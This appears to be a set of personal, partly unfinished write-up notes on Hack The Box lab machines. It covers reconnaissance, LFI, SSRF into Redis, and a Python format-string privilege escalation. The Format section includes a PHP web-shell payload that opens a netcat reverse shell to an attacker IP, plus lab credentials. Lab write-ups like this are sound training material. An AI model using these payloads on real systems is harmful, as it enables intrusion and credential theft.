# Medium\_machines

### Agile

#### Reco

#### Weaponisation

#### Exploitation

#### User flag

#### Root flag

![](https://hackmd.io/\_uploads/H1N6hTich.png)

### OnlyForYou

> To obtain access we must read various files on the web using an LFI to find a vulnerability in the form. Using the form we can run CERs. To move to a user we must perform a Cypher Injection on an internal website to get the password. And for the escalation of privileges we must modify a file, create a tar.gz and upload it to the Gogs web intera and then download the file using pip3 and thus be able to modify the bash to SUID permissions.

#### Reco

1. nmap 10.10.11.210 -sVC
2. dir busting
   * there is a subdomain ![](https://hackmd.io/\_uploads/rytoaqich.png)
   * add it also to the /etc/hosts

#### Weaponisation

1. beta subdomain
   * allows us to download source code ![](https://hackmd.io/\_uploads/BklH0qoqh.png)
     * When analyzing it we realize that in the / download path if in the parameter image start with 2 points then launch a message that says Hacking detected and makes us a redirect to / list. ![](https://hackmd.io/\_uploads/HkT9C5iq3.png)

#### Exploitation

1.

#### User flag

#### Root flag

### Format

#### Reco

1. nmap: `nmap -sVC 10.10.11.213`
   * 22 SSH
   * 80,3000 HTTP
2. add microblog.htb:3000 to /etc/hosts
3. FUZZING - subdomain enumeration
   * app, sunny
     * add these both to /etc/hosts also
4. Website
   * "Contribute here!" in footer -> source code of app.microblog.htb

#### Weaponisation

1. LFI
   * we can use ID parameter for LFI
     * create a blog -> edit blog
       * capture req to add the H1/text
         * we can edit the ID paramater for LFI ![](https://hackmd.io/\_uploads/SkOVqn0q2.png)

#### Exploitation

1. PRO account
   * dashboard page and source code -> something about PRO
   * assign pro to our session using SSRF

> curl -X "HSET" http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:testy%20pro%20true%20a/b

* insert the username of registration

2. Uploading reverse shell
   * use this to get RS on target machine + change your blog name

> id=/var/www/microblog/\<your\_blog\_name>/uploads/rev.php\&header=<%3fphp+echo+shell\_exec("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.14.30+443+>/tmp/f")%3b%3f> ![](https://hackmd.io/\_uploads/rJj-j309h.png)

* after visiting the /uploads/rev.php we will get our RS

#### User flag

1. Connect to Redis-cli
   * socks config file
     * redis-cli -s /var/run/redis/redis.sock
     * keys \* ![](https://hackmd.io/\_uploads/SyLwo205h.png)
     * hgetall cooper.dooper
       * `cooper:zooperdoopercooper`
2. SSH connect to obtain user flag

#### Root flag

1. trying `sudo -l`
   * we can run /usr/bin/licence
     * this file is also readable
       * [Python format function vuln](https://web.archive.org/web/20230624063634/https://podalirius.net/en/articles/python-format-string-vulnerabilities/)
2. Vuln
   * register a user using redis-cli and use the vuln in username to print all variables
     * `HSET test2 username test1 password test first-name`
     * `{license.__init__.__globals__} last-name test pro false` ![](https://hackmd.io/\_uploads/S1LOThRq3.png)
   * run /usr/bin/licence as sudo to provision the licence of our "test2" user
     * `sudo /usr/bin/license -p test2` ![](https://hackmd.io/\_uploads/Hy\_na3Rc2.png)
       * we obtained SSH credentials for root
         * `root:unCR4ckaBL3Pa$$w0rd`
3. SSH login as a root to obtain root flag

### Download

#### Reco

* `sudo nmap -sVC <IP>`
  * ![](https://hackmd.io/\_uploads/SkZBpNRo3.png)
  * 22 SSH
  * 80 HTTP
    * redirect -> add download.htb to /etc/hosts
* website analysis
  * website for uploading && downloading large files
  * upload subsite
    * download.htb/files/upload
  * login && register subsite
    * downlaod.htb/auth/login
    * download.htb/auth/register

#### Weaponisation

1. while trying to upload a file with BurpSuite, I found out tha it is an **Express** based website - upload the file -> we obtain unique UID and link ![](https://hackmd.io/\_uploads/H1ZfZSRo3.png) - click "Copy Link" button -> small popup window followed by an alert - it is a file called copy.js (contains the code for the function, nothing vulnerable) - there is also a JWT token withing the download + a .sig cooke ![](https://hackmd.io/\_uploads/HyJBZrAj3.png) - decoded token: `{"flashes":{"info":[],"error":[],"success":[]}}`
   * Download feature
     * redirects us to the link:
       * `http://download.htb/files/download/0623ba64-6749-48a4-9a08-a58658b74852`
         * this could be used to download other files...
         * uploads are probably stored within a /downloads or /uploads folder on the machine
           * basic LFI with some Express file names...
             * `..%2fapp.js` worked... ![](https://hackmd.io/\_uploads/HJMYk8Cjn.png)
               * there is package.json as part of the folders too: `{ "name": "download.htb", "version": "1.0.0", "description": "", "main": "app.js", "scripts": { "test": "echo \"Error: no test specified\" && exit 1", "dev": "nodemon --exec ts-node --files ./src/app.ts", "build": "tsc" }, "keywords": [], "author": "wesley", "license": "ISC", "dependencies": { "@prisma/client": "^4.13.0", "cookie-parser": "^1.4.6", "cookie-session": "^2.0.0", "express": "^4.18.2", "express-fileupload": "^1.4.0", "zod": "^3.21.4" }, "devDependencies": { "@types/cookie-parser": "^1.4.3", "@types/cookie-session": "^2.0.44", "@types/express": "^4.17.17", "@types/express-fileupload": "^1.4.1", "@types/node": "^18.15.12", "@types/nunjucks": "^3.2.2", "nodemon": "^2.0.22", "nunjucks": "^3.2.4", "prisma": "^4.13.0", "ts-node": "^10.9.1", "typescript": "^5.0.4" } }`
         * AUTHOR: **WESLEY**
2. enumerating LOGIN
   * create a test user && login -> download\_session cookie has some more information (decoded): `{"flashes":{"info":[],"error":[],"success":[]},"user":{"id":16,"username":"test123"}}`
   * .sig token is also different
     * signature of a cookie, changes by the extension
3. VULN for COOKIE on websites running Express
   * [cookie-monster](https://github.com/DigitalInterruption/cookie-monster)
   * [nodeJS Express](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nodejs-express)

#### Exploitation

1. Blind injection - Cookie monster Brute Force Lets sum up all facts we obtained:
   * **.sig** ... key for the token structure, needed fot Cookie Monster
   * User is **wesley**, hashes are UNsalted and used directly for auth -> brute forcing could be a way
   * there is **SQL query** that is somehow injectable
   * **cookies are not validated** any way -> it checks whether a `true` condition is returned from `findFirst` from the `prisma` API module...Blind Injection by redirect could be possibility

### Manager

#### Reco

nmap -sVC 10.10.11.236 -Pn - 53 DOMAIN (Simple DNS Plus) - 80 HTTP (MS IIS httpd 10.0) - 88 KERBEROS-SEC - 135 MSRPC - 139 NETBIOS-SSN - 389 LDAP - ssl-cert: dc01.manager.htb - 445 MS-DS? - 464 KPASSWD5? - 593 NCACN\_HTTP (RMS win RPC over HTTP 1.0) - 636 SSL/LDAP - DNS: dc01.manager.htb - 1433 MS-SQL-S - MSSQL Server 2019 - 3269 LDAP - 3269 SSL/LDAP - active SMB2 - sec-mode: 311 (message signing enabled and required)
